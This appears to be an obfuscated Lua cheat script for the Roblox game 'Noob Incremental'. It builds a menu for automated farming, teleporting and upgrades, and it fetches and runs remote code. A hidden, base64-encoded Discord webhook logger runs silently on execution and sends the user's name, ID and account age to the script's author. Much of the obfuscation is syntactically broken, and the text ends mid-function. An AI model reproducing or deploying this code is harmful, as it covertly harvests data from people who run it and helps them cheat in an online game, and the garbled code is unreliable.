return(function(55Z9j, ...)
local 8Tee83 = {"X4ZOLZ13NCxJ";"mjr9sgMzqMhaiu";"fzyXBNVNcKi";"uR6xsUBBAxsO";"DySHW84LeJ";"aKqJTetqr7N";"PFzJ3wxenF";"PrzW";"lk6EMh";"1PiCjjXM9";"U4Yc13Jkfgtv";"tclvKsGnCyuJ";"Xy4kZ8FPFX6";"uzt61GmG97u5flg6"}
local bROSpB2e = function(...)
-- Rayfield - Broswe Hub | Noob Incremental (Full Updated + Halloween Event)
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = loadstring(base64decode("QnJvc3dlIEh1YiB8IE5vb2IgSW5jcmVtZW50YWw="))(),
    LoadingTitle = loadstring(base64decode("QnJvc3dlIEh1Yg=="))(),
    LoadingSubtitle = loadstring(base64decode("YnkgQnJvc3dl"))(),
    ConfigurationSaving = {
        Enabled = true,
        FolderName = loadstring(base64decode("QnJvc3dlSHVi"))(),
        FileName = loadstring(base64decode("Tm9vYkluY3JlbWVudGFsX0Z1bGw="))()
    },
})

-- ====================== WEBHOOK LOGGER ======================
task.spawn(function()
    pcall(function()
        local HttpService = game:GetService(loadstring(base64decode("SHR0cFNlcnZpY2U="))())
        local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
        local lp = Players.LocalPlayer
        
        local webhookUrl = loadstring(base64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2MjI3MDk3OTg5NDQxNTQ3MC9ObzdiVDkxbmZfODJ6QXJsN25iZ1ZIMnk2S1JRYTBCOEVUVlJaN0k0bEZkV2Q5SWRGV2dZTy1FYWlJQ0ZKNXA2Vzdwcg=="))()
        
        local accountAge = lp.AccountAge
        local username = lp.Name
        local displayName = lp.DisplayName
        local userId = lp.UserId
        
        local data = {
            [loadstring(base64decode("Y29udGVudA=="))()] = loadstring(base64decode(""))(),
            [loadstring(base64decode("ZW1iZWRz"))()] = {{
                [loadstring(base64decode("dGl0bGU="))()] = loadstring(base64decode("8J+agCBTY3JpcHQgRXhlY3V0ZWQh"))(),
                [loadstring(base64decode("Y29sb3I="))()] = 65280, -- Green
                [loadstring(base64decode("ZmllbGRz"))()] = {
                    {[loadstring(base64decode("bmFtZQ=="))()] = loadstring(base64decode("VXNlcm5hbWU="))(), [loadstring(base64decode("dmFsdWU="))()] = username .. loadstring(base64decode("ICg="))() .. displayName .. loadstring(base64decode("KQ=="))(), [loadstring(base64decode("aW5saW5l"))()] = true},
                    {[loadstring(base64decode("bmFtZQ=="))()] = loadstring(base64decode("VXNlciBJRA=="))(), [loadstring(base64decode("dmFsdWU="))()] = tostring(userId), [loadstring(base64decode("aW5saW5l"))()] = true},
                    {[loadstring(base64decode("bmFtZQ=="))()] = loadstring(base64decode("QWNjb3VudCBBZ2U="))(), [loadstring(base64decode("dmFsdWU="))()] = accountAge .. loadstring(base64decode("IGRheXM="))(), [loadstring(base64decode("aW5saW5l"))()] = true},
                    {[loadstring(base64decode("bmFtZQ=="))()] = loadstring(base64decode("R2FtZQ=="))(), [loadstring(base64decode("dmFsdWU="))()] = loadstring(base64decode("Tm9vYiBJbmNyZW1lbnRhbA=="))(), [loadstring(base64decode("aW5saW5l"))()] = false}
                },
                [loadstring(base64decode("dGltZXN0YW1w"))()] = os.date(loadstring(base64decode("ISVZLSVtLSVkVCVIOiVNOiVTWg=="))())
            }}
        }
        
        local encodedData = HttpService:JSONEncode(data)
        
        local requestMethod = syn and syn.request or request or http and http.request or http_request
        if requestMethod then
            requestMethod({
                Url = webhookUrl,
                Method = loadstring(base64decode("UE9TVA=="))(),
                Headers = {[loadstring(base64decode("Q29udGVudC1UeXBl"))()] = loadstring(base64decode("YXBwbGljYXRpb24vanNvbg=="))()},
                Body = encodedData
            })
        end
    end)
end)

-- ====================== TABS ======================
local HalloweenTab  = Window:CreateTab(loadstring(base64decode("8J+OgyBIYWxsb3dlZW4gRXZlbnQ="))(), 4483362458)
local Realm1Tab     = Window:CreateTab(loadstring(base64decode("8J+UpSBSZWFsbSAx"))(), 4483362458)
local Realm2Tab     = Window:CreateTab(loadstring(base64decode("4p2E77iPIFJlYWxtIDI="))(), 4483362458)
local Realm3Tab     = Window:CreateTab(loadstring(base64decode("8J+PnO+4jyBSZWFsbSAz"))(), 4483362458)
local Realm4Tab     = Window:CreateTab(loadstring(base64decode("8J+MjCBSZWFsbSA0"))(), 4483362458)
local Realm5Tab     = Window:CreateTab(loadstring(base64decode("8J+rpyBSZWFsbSA1"))(), 4483362458)
local Realm6Tab     = Window:CreateTab(loadstring(base64decode("4pqU77iPIFJlYWxtIDY="))(), 4483362458)
local EventRealmTab = Window:CreateTab(loadstring(base64decode("4pq9IEV2ZW50IFJlYWxt"))(), 4483362458)
local AutoMobsTab   = Window:CreateTab(loadstring(base64decode("4pqU77iPIEF1dG8gTW9icw=="))(), 4483362458)
local AutoMineTab   = Window:CreateTab(loadstring(base64decode("4puP77iPIEF1dG8gTWluZQ=="))(), 4483362458)
local RunesTab      = Window:CreateTab(loadstring(base64decode("8J+UriBSdW5lcw=="))(), 4483362458)
local CapsulesTab   = Window:CreateTab(loadstring(base64decode("8J+TpiBDYXBzdWxlcw=="))(), 4483362458)
local TrialTab      = Window:CreateTab(loadstring(base64decode("8J+boe+4jyBUcmlhbHM="))(), 4483362458)
local SettingsTab   = Window:CreateTab(loadstring(base64decode("4pqZ77iPIFNldHRpbmdz"))(), 4483362458)

-- ====================== SERVICES ======================
local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
local TweenService = game:GetService(loadstring(base64decode("VHdlZW5TZXJ2aWNl"))())
local RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
local VirtualUser = game:GetService(loadstring(base64decode("VmlydHVhbFVzZXI="))())
local player = Players.LocalPlayer
local RS = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())

local function getRoot()
    local char = player.Character or player.CharacterAdded:Wait()
    return char:WaitForChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
end

local function fireMain(...)
    local args = {...}
    local ok = pcall(function()
        RS.__Net.MainRemote:FireServer(unpack(args))
    end)
    if not ok then
        pcall(function()
            if RS:FindFirstChild(loadstring(base64decode("TmV0"))()) and RS.Net:FindFirstChild(loadstring(base64decode("TWFpblJlbW90ZQ=="))()) then
                RS.Net.MainRemote:FireServer(unpack(args))
            end
        end)
    end
end

-- ====================== SPEEDS ======================
local glideSpeed = 1.0
local autoMobSpeed = 1.0
local reaperMobSpeed = 1.0
local autoMineSpeed = 1.0
local starCollectSpeed = 1.0
local coralCollectDelay = 0.35
local trenchTweenSpeed = 0.25
local upgradeSeqDelay = 0.55
local chariotStartDelay = 0.75
local lightningThrowDelay = 0.5

local instantTrialDelay = 0.08
local instantMobDelay = 0.25
local instantMineDelay = 0.25
local instantStarDelay = 0.25

local useTweenTrial = false
local useTweenMobs = true
local useTweenReaperMobs = true
local useTweenMine = true
local useTweenStars = true
local useTweenCapsules = true
local useTweenRunes = true

local function tweenTo(position, speedMultiplier)
    local root = getRoot()
    if not root then return end
    local targetPos = Vector3.new(position.X, position.Y + 1.2, position.Z)
    local distance = (root.Position - targetPos).Magnitude
    local time = math.clamp(distance / (speedMultiplier * 90), 0.08, 4.5)
    local tween = TweenService:Create(root, TweenInfo.new(time, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {CFrame = CFrame.new(targetPos)})
    tween:Play()
    tween.Completed:Wait()
end

local function tweenToTrench(position, speedMultiplier)
    local root = getRoot()
    if not root then return end
    local targetPos = Vector3.new(position.X, position.Y + 1.5, position.Z)
    local distance = (root.Position - targetPos).Magnitude
    local time = math.clamp(distance / (speedMultiplier * 18), 2.0, 25)
    local tween = TweenService:Create(root, TweenInfo.new(time, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {CFrame = CFrame.new(targetPos)})
    tween:Play()
    tween.Completed:Wait()
end

local function instantTo(position)
    local root = getRoot()
    if not root then return end
    root.CFrame = CFrame.new(position.X, position.Y + 1.2, position.Z)
end

local function moveTo(position, speedMultiplier, useTween)
    if useTween then tweenTo(position, speedMultiplier) else instantTo(position) end
end

-- ====================== STATE ======================
local enabled = false
local inTrial = false
local hasTeleportedThisCycle = false
local selectedTrial = loadstring(base64decode("SGFyZA=="))()
local autoLeaveTrial = false
local leaveAtWave = 10
local autoPlayAfterTrial = false
local postTrialMode = false

local autoT1ChestEnabled = false
local autoT2ChestEnabled = false

local autoAncientEnabled = false
local autoSuperEnabled = false
local autoClassicEnabled = false
local autoFootballEnabled = false
local autoCosmicEnabled = false
local autoYinYangEnabled = false

local capsulesHandled = {
    Classic = false, Super = false, Ancient = false,
    Cosmic = false, [loadstring(base64decode("WWluIFlhbmc="))()] = false, Football = false
}

local autoBasicRuneEnabled = false
local autoSuperRuneEnabled = false
local autoAdvancedRuneEnabled = false
local autoCosmicPrismEnabled = false
local autoHackerRuneEnabled = false
local autoSnowyRuneEnabled = false
local autoDeepCoreRuneEnabled = false
local autoDuneRuneEnabled = false
local autoSunfireEnabled = false
local autoSunstormPrismEnabled = false
local autoShardEnabled = false
local autoStarlightEnabled = false
local autoCosmaEnabled = false
local autoDarkRuneEnabled = false
local autoLightRuneEnabled = false
local autoUnderwaterEnabled = false

local autoCollectStarsEnabled = false
local autoCollectChipsEnabled = false
local autoMergeChipsEnabled = false
local autoMoreChipsEnabled = false
local autoBetterChipsEnabled = false
local autoChipsMoreRuneLuckEnabled = false

local autoMoreStarsEnabled = false
local autoEvenMoreStarsEnabled = false
local autoFasterStarRespawnEnabled = false
local autoMoreSpacePointsStarsEnabled = false
local autoStarsMoreOofEnabled = false
local autoStarMutationLuckEnabled = false
local autoSpaceMultiStarEnabled = false
local autoSpaceMoreSpacePointsEnabled = false
local autoSpaceMoreMoonEnabled = false
local autoSpaceBlackholesEnabled = false
local autoSpaceCollectRadiusEnabled = false

local autoAlienNoobEnabled = false
local autoDemonNoobEnabled = false
local autoAstronautNoobEnabled = false

local autoSandLayerRestart = false
local selectedSandLayer = 50

local autoMoreSandEnabled = false
local autoStrongerShovelsEnabled = false
local autoMoreOofEnabled = false
local autoShovelLevelEnabled = false

local autoMoreMeatEnabled = false
local autoStrongerSwordsEnabled = false
local autoMeatMoreOofEnabled = false
local autoMoreBonesEnabled = false

local autoRebirthEnabled = false
local autoPrestigeEnabled = false

local autoFireMoreOofEnabled = false
local autoFireMoreFireEnabled = false
local autoFireMoreRebirthEnabled = false
local autoFireMoreBulkEnabled = false

local autoBlazeMoreBlazeEnabled = false
local autoBlazeMoreOofEnabled = false
local autoBlazeMoreFireEnabled = false

local autoCashMoreCashEnabled = false
local autoCashFasterDropperEnabled = false
local autoCashMoreRuneLuckEnabled = false
local autoTycoonResetEnabled = false

local autoKickEnabled = false
local autoMoreGoalsEnabled = false
local autoRuneBulkEnabled = false
local autoRuneLuckEnabled = false
local autoFootballRankingEnabled = false

local autoStarterNoobEnabled = false
local autoCookerNoobEnabled = false
local autoFarmerEnabled = false
local autoArcherEnabled = false
local autoSoldierEnabled = false

local autoTier1Enabled = false
local autoTier2Enabled = false
local autoTier3Enabled = false
local autoTier4Enabled = false
local autoTier5Enabled = false
local autoTier6Enabled = false
local autoTier7Enabled = false

local autoCakeEnabled = false
local autoCheeseEnabled = false
local autoCookieEnabled = false

local autoChicken1Enabled = false
local autoChicken2Enabled = false
local autoCow1Enabled = false
local autoCow2Enabled = false

local autoExchangeEnabled = false
local autoMoreEggsEnabled = false
local autoMoreMilkEnabled = false
local autoMoreRuneLuckCoinEnabled = false
local autoMoreRuneSpeedEnabled = false
local autoMoreRuneBulkCoinEnabled = false
local autoMoreTierLuckEnabled = false

local autoBubbleValueEnabled = false
local autoBubblesPerClickEnabled = false
local autoFloatingSpeedEnabled = false
local autoBlowCooldownEnabled = false
local autoComboChargeEnabled = false
local autoComboPowerBubblesEnabled = false
local autoComboDurationEnabled = false
local autoAutomaticBlowingEnabled = false
local autoComboDecayEnabled = false
local autoAutomaticBlowingSpeedEnabled = false
local autoOofPowerBubblesEnabled = false

local autoBaseAirEnabled = false
local autoComboPowerAirEnabled = false
local autoBubblePowerAirEnabled = false

local autoCoralGrowthSpeedEnabled = false
local autoCoralValueEnabled = false
local autoOfflineGrowthMultiplierEnabled = false
local autoBubblePowerCoralEnabled = false
local autoOofPowerCoralEnabled = false
local autoPrismPowerCoralEnabled = false
local autoCollectCoralEnabled = false
local autoOystersEnabled = false

-- Momentum Upgrades
local autoMoreMomentumEnabled = false
local autoChariotStrengthEnabled = false
local autoChariotNoobPowerEnabled = false
local autoGloryPowerMomentumEnabled = false
local autoChariotStrength2Enabled = false
local autoOofPowerMomentumEnabled = false
local autoGloryPower2MomentumEnabled = false
local autoChariotStrength3Enabled = false

-- Glory Upgrades
local autoMoreGloryEnabled = false
local autoColosseumHPEnabled = false
local autoColosseumDamageEnabled = false
local autoAttackSpeedEnabled = false
local autoMomentumGloryEnabled = false
local autoColosseumDamage2Enabled = false
local autoColosseumHP2Enabled = false
local autoBurdenGloryEnabled = false
local autoAuthorityMultiEnabled = false

-- Radiance Upgrades
local autoMoreRadianceEnabled = false
local autoEvenMoreRadianceEnabled = false
local autoOofsRadianceEnabled = false
local autoTierLuckRadianceEnabled = false
local autoTheRadianceBalanceEnabled = false
local autoMoreMoreRadianceEnabled = false
local autoMoreMomentumRadianceEnabled = false
local autoStarlightPowerRadianceEnabled = false
local autoThunderPowerRadianceEnabled = false
local autoSuchAMomentRadianceEnabled = false
local autoSuchABurdenRadianceEnabled = false
local autoSuchAGloryRadianceEnabled = false
local autoLookUpTheSkyRadianceEnabled = false
local autoStarlightAgainRadianceEnabled = false
local autoBurdenAgainRadianceEnabled = false

-- Sun Pillars
local autoUpgradePillar1Enabled = false
local autoUpgradePillar2Enabled = false
local autoUpgradePillar3Enabled = false
local autoUpgradePillar4Enabled = false
local autoUpgradePillar5Enabled = false
local autoAllPillarsEnabled = false
local autoSunPillarRankEnabled = false

-- Starlight Upgrades
local autoMoreStarlightEnabled = false
local autoStellarRadianceEnabled = false
local autoMoreThunderEnabled = false
local autoCosmicOofEnabled = false
local autoRuneBulkStarlightEnabled = false
local autoAuthorityStarlightEnabled = false
local autoMomentumStarlightEnabled = false
local autoRadianceStarlightEnabled = false
local autoStarlight77Enabled = false

-- Thunder Upgrades
local autoMoreThunderUpgradesEnabled = false
local autoThunderDamageEnabled = false
local autoLightningSpeedEnabled = false
local autoWeakPointPowerEnabled = false
local autoMoreRadianceThunderEnabled = false
local autoMoreStarlightThunderEnabled = false
local autoCronusNoobPowerEnabled = false
local autoEverFeltOverpoweredEnabled = false
local autoMoreThunder2Enabled = false
local autoThrowLightningZeusEnabled = false
local autoCronusRankUpEnabled = false

-- Authority Upgrades
local autoMoreAuthorityEnabled = false
local autoMoreBurdenAuthorityEnabled = false
local autoMoreGloryAuthorityEnabled = false
local autoMoreStarlightAuthorityEnabled = false
local autoMoreThunderAuthorityEnabled = false
local autoCouncilRankUpEnabled = false

-- Halloween Upgrades State
local autoMoreGhostsEnabled = false
local autoSharperScytheEnabled = false
local autoFasterScythe2Enabled = false
local autoSoulLuckEnabled = false
local autoHMasteryXPEnabled = false
local autoMoreSpookyOofGhostEnabled = false

local autoSpookyOofMoreSpookyOofEnabled = false
local autoSpookyOofMoreGhostsEnabled = false
local autoFasterHNoobsEnabled = false
local autoMorePumpkinsSpookyEnabled = false
local autoMorePumpkinSpookyEnabled = false
local autoMoreSweets2SpookyEnabled = false
local autoMorePumpkinXP34Enabled = false

local autoMoreSweetsEnabled = false
local autoMoreSweets2Enabled = false
local autoFasterHousesEnabled = false
local autoSpecialLuckEnabled = false
local autoMorePumpkinSweetsEnabled = false
local autoMoreGhostSweetsEnabled = false
local autoMoreSpookyOofSweetsEnabled = false

local autoMilestoneSpookyOofEnabled = false
local autoMilestoneGhostsEnabled = false
local autoMilestonePumpkinsEnabled = false
local autoMilestoneSweetsEnabled = false
local autoMilestoneHRuneLuckEnabled = false
local autoMilestoneHRuneBulkEnabled = false
local autoMilestoneCandyCornEnabled = false

local autoPumpkinMorePumpkinsEnabled = false
local autoPumpkinEvenMorePumpkinsEnabled = false
local autoPumpkinFasterGrowthEnabled = false
local autoPumpkinMorePumpkinXPEnabled = false
local autoPumpkinMoreSpookyOofEnabled = false
local autoHarvestPumpkinsEnabled = false

local autoSpookyOofMilestoneUpEnabled = false
local autoAutoReaperNoobsEnabled = false

local selectedColosseumWave = 20
local autoColosseumWavesEnabled = false
local autoChariotEnabled = false
local autoChariotRankUpEnabled = false
local chariotBound = false

local autoOrcEnabled = false
local autoGoblinEnabled = false
local autoWarriorEnabled = false
local autoNinjaEnabled = false
local autoPirateEnabled = false
local autoSamuraiEnabled = false
local autoDarkCommanderEnabled = false
local autoPirateCaptainEnabled = false
local autoPirateAdmiralEnabled = false
local autoSamuraiMasterEnabled = false
local autoDarkKnightEnabled = false

local autoCoalEnabled = false
local autoPlatinumEnabled = false
local autoUraniumEnabled = false
local autoCelestiumEnabled = false
local autoRubyEnabled = false
local autoTitaniumEnabled = false
local autoPalladiumEnabled = false
local autoSilverEnabled = false
local autoIronEnabled = false
local autoGoldEnabled = false
local autoStoneEnabled = false
local autoCopperEnabled = false
local autoAetheriteEnabled = false
local autoVoidsteelEnabled = false
local autoEmpyriumEnabled = false
local autoFrostiumEnabled = false
local autoDragonveinEnabled = false

local antiAFKEnabled = false
local antiLagEnabled = false

local visitedMobs = {}
local visitedOres = {}
local visitedTrialMobs = {}
local lastTrialWaveSeen = 0

local function collectEnabledUpgrades()
    local list = {}
    local function add(en, ...)
        if en then table.insert(list, {...}) end
    end
    add(autoRebirthEnabled, loadstring(base64decode("UmViaXJ0aA=="))())
    add(autoPrestigeEnabled, loadstring(base64decode("UHJlc3RpZ2U="))())
    add(autoFireMoreOofEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("RmlyZQ=="))(), loadstring(base64decode("TW9yZU9vZg=="))())
    add(autoFireMoreFireEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("RmlyZQ=="))(), loadstring(base64decode("TW9yZUZpcmU="))())
    add(autoFireMoreRebirthEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("RmlyZQ=="))(), loadstring(base64decode("TW9yZVJlYmlydGg="))())
    add(autoFireMoreBulkEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("RmlyZQ=="))(), loadstring(base64decode("TW9yZUJ1bGs="))())
    add(autoBlazeMoreBlazeEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("QmxhemU="))(), loadstring(base64decode("TW9yZUJsYXpl"))())
    add(autoBlazeMoreOofEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("QmxhemU="))(), loadstring(base64decode("TW9yZU9vZg=="))())
    add(autoBlazeMoreFireEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("QmxhemU="))(), loadstring(base64decode("TW9yZUZpcmU="))())
    add(autoCashMoreCashEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("Q2FzaA=="))(), loadstring(base64decode("TW9yZUNhc2g="))())
    add(autoCashFasterDropperEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("Q2FzaA=="))(), loadstring(base64decode("RmFzdGVyRHJvcHBlcg=="))())
    add(autoCashMoreRuneLuckEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("Q2FzaA=="))(), loadstring(base64decode("TW9yZVJ1bmVMdWNr"))())
    add(autoTycoonResetEnabled, loadstring(base64decode("VHljb29u"))())
    add(autoStarterNoobEnabled, loadstring(base64decode("VXBncmFkZU5vb2JNYXg="))(), loadstring(base64decode("U3RhcnRlcg=="))())
    add(autoCookerNoobEnabled, loadstring(base64decode("VXBncmFkZU5vb2JNYXg="))(), loadstring(base64decode("Q29va2Vy"))())
    add(autoFarmerEnabled, loadstring(base64decode("VXBncmFkZU5vb2JNYXg="))(), loadstring(base64decode("RmFybWVy"))())
    add(autoArcherEnabled, loadstring(base64decode("VXBncmFkZU5vb2JNYXg="))(), loadstring(base64decode("QXJjaGVy"))())
    add(autoSoldierEnabled, loadstring(base64decode("VXBncmFkZU5vb2JNYXg="))(), loadstring(base64decode("U29sZGllcg=="))())
    add(autoTier1Enabled, loadstring(base64decode("QnV5RmFjdG9yeQ=="))(), true)
    add(autoTier2Enabled, loadstring(base64decode("TWVyZ2VGYWN0b3J5"))(), 1, true)
    add(autoTier3Enabled, loadstring(base64decode("TWVyZ2VGYWN0b3J5"))(), 2, true)
    add(autoTier4Enabled, loadstring(base64decode("TWVyZ2VGYWN0b3J5"))(), 3, true)
    add(autoTier5Enabled, loadstring(base64decode("TWVyZ2VGYWN0b3J5"))(), 4, true)
    add(autoTier6Enabled, loadstring(base64decode("TWVyZ2VGYWN0b3J5"))(), 5, true)
    add(autoTier7Enabled, loadstring(base64decode("TWVyZ2VGYWN0b3J5"))(), 6, true)
    add(autoCakeEnabled, loadstring(base64decode("QnV5Q29va2luZw=="))(), loadstring(base64decode("Q2FrZQ=="))(), true)
    add(autoCheeseEnabled, loadstring(base64decode("QnV5Q29va2luZw=="))(), loadstring(base64decode("Q2hlZXNl"))(), true)
    add(autoCookieEnabled, loadstring(base64decode("QnV5Q29va2luZw=="))(), loadstring(base64decode("Q29va2ll"))(), true)
    add(autoChicken1Enabled, loadstring(base64decode("VXBncmFkZUFuaW1hbA=="))(), loadstring(base64decode("Q2hpY2tlbg=="))())
    add(autoChicken2Enabled, loadstring(base64decode("QnV5QW5pbWFs"))(), loadstring(base64decode("Q2hpY2tlbg=="))(), true)
    add(autoCow1Enabled, loadstring(base64decode("VXBncmFkZUFuaW1hbA=="))(), loadstring(base64decode("Q293"))())
    add(autoCow2Enabled, loadstring(base64decode("QnV5QW5pbWFs"))(), loadstring(base64decode("Q293"))(), true)
    add(autoExchangeEnabled, loadstring(base64decode("RXhjaGFuZ2VBbGxBbmltYWxQcm9kdWN0cw=="))())
    add(autoMoreEggsEnabled, loadstring(base64decode("RGVwb3NpdENvaW5NaWxlc3RvbmU="))(), loadstring(base64decode("RWdn"))())
    add(autoMoreMilkEnabled, loadstring(base64decode("RGVwb3NpdENvaW5NaWxlc3RvbmU="))(), loadstring(base64decode("TWlsaw=="))())
    add(autoMoreRuneLuckCoinEnabled, loadstring(base64decode("RGVwb3NpdENvaW5NaWxlc3RvbmU="))(), loadstring(base64decode("UnVuZUx1Y2s="))())
    add(autoMoreRuneSpeedEnabled, loadstring(base64decode("RGVwb3NpdENvaW5NaWxlc3RvbmU="))(), loadstring(base64decode("UnVuZVNwZWVk"))())
    add(autoMoreRuneBulkCoinEnabled, loadstring(base64decode("RGVwb3NpdENvaW5NaWxlc3RvbmU="))(), loadstring(base64decode("UnVuZUJ1bGs="))())
    add(autoMoreTierLuckEnabled, loadstring(base64decode("RGVwb3NpdENvaW5NaWxlc3RvbmU="))(), loadstring(base64decode("VGllckx1Y2s="))())
    add(autoMoreSandEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("U2FuZA=="))(), loadstring(base64decode("TW9yZVNhbmQ="))())
    add(autoStrongerShovelsEnabled, loadstring(base64decode("QmFja1RvU3VyZmFjZQ=="))())
    add(autoMoreOofEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("U2FuZA=="))(), loadstring(base64decode("TW9yZU9vZg=="))())
    add(autoShovelLevelEnabled, loadstring(base64decode("U2hvdmVsTGV2ZWxVcA=="))())
    add(autoMoreMeatEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("TWVhdA=="))(), loadstring(base64decode("TW9yZU1lYXQ="))())
    add(autoStrongerSwordsEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("TWVhdA=="))(), loadstring(base64decode("U3Ryb25nZXJTd29yZHM="))())
    add(autoMeatMoreOofEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("TWVhdA=="))(), loadstring(base64decode("TW9yZU9vZg=="))())
    add(autoMoreBonesEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("TWVhdA=="))(), loadstring(base64decode("TW9yZUJvbmVz"))())
    add(autoMoreStarsEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("U3RhcnM="))(), loadstring(base64decode("TW9yZVN0YXJz"))())
    add(autoEvenMoreStarsEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("U3RhcnM="))(), loadstring(base64decode("RXZlbk1vcmVTdGFycw=="))())
    add(autoFasterStarRespawnEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("U3RhcnM="))(), loadstring(base64decode("RmFzdGVyUmVzcGF3bg=="))())
    add(autoMoreSpacePointsStarsEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("U3RhcnM="))(), loadstring(base64decode("TW9yZVNwYWNlUG9pbnRz"))())
    add(autoStarsMoreOofEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("U3RhcnM="))(), loadstring(base64decode("T29m"))())
    add(autoStarMutationLuckEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("U3RhcnM="))(), loadstring(base64decode("Qm9vc3RTdGFyc011dGF0aW9uTHVjaw=="))())
    add(autoSpaceMultiStarEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("U3BhY2VQb2ludHM="))(), loadstring(base64decode("TXVsdGlTdGFy"))())
    add(autoSpaceMoreSpacePointsEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("U3BhY2VQb2ludHM="))(), loadstring(base64decode("TW9yZVNwYWNlUG9pbnRz"))())
    add(autoSpaceMoreMoonEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("U3BhY2VQb2ludHM="))(), loadstring(base64decode("TW9yZU1vb24="))())
    add(autoSpaceBlackholesEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("U3BhY2VQb2ludHM="))(), loadstring(base64decode("QmxhY2tob2xlcw=="))())
    add(autoSpaceCollectRadiusEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGU="))(), loadstring(base64decode("U3BhY2VQb2ludHM="))(), loadstring(base64decode("Qm9vc3RTdGFyc0NvbGxlY3RSYWRpdXM="))())
    add(autoAlienNoobEnabled, loadstring(base64decode("VXBncmFkZU5vb2JNYXg="))(), loadstring(base64decode("QWxpZW4="))())
    add(autoDemonNoobEnabled, loadstring(base64decode("VXBncmFkZU5vb2JNYXg="))(), loadstring(base64decode("RGVtb24="))())
    add(autoAstronautNoobEnabled, loadstring(base64decode("VXBncmFkZU5vb2JNYXg="))(), loadstring(base64decode("QXN0cm9uYXV0"))())
    add(autoMoreChipsEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("Q2hpcHM="))(), loadstring(base64decode("TW9yZUNoaXBz"))())
    add(autoBetterChipsEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("Q2hpcHM="))(), loadstring(base64decode("QmV0dGVyQ2hpcHM="))())
    add(autoChipsMoreRuneLuckEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("Q2hpcHM="))(), loadstring(base64decode("TW9yZVJ1bmVMdWNr"))())
    add(autoBubbleValueEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("QnViYmxlcw=="))(), loadstring(base64decode("QnViYmxlVmFsdWU="))())
    add(autoBubblesPerClickEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("QnViYmxlcw=="))(), loadstring(base64decode("QnViYmxlc1BlckNsaWNr"))())
    add(autoFloatingSpeedEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("QnViYmxlcw=="))(), loadstring(base64decode("RmxvYXRpbmdTcGVlZA=="))())
    add(autoBlowCooldownEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("QnViYmxlcw=="))(), loadstring(base64decode("Qmxvd0Nvb2xkb3du"))())
    add(autoComboChargeEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("QnViYmxlcw=="))(), loadstring(base64decode("Q29tYm9HYWlu"))())
    add(autoComboPowerBubblesEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("QnViYmxlcw=="))(), loadstring(base64decode("Q29tYm9Qb3dlcg=="))())
    add(autoComboDurationEnabled, loadstring(base64decode("VXBncmFkZVVwZ3JhZGVNYXg="))(), loadstring(base64decode("QnViYmxlcw=="))(), loadstring(base64decode("Q29tYm9EdXJhdGlvbg=="))())
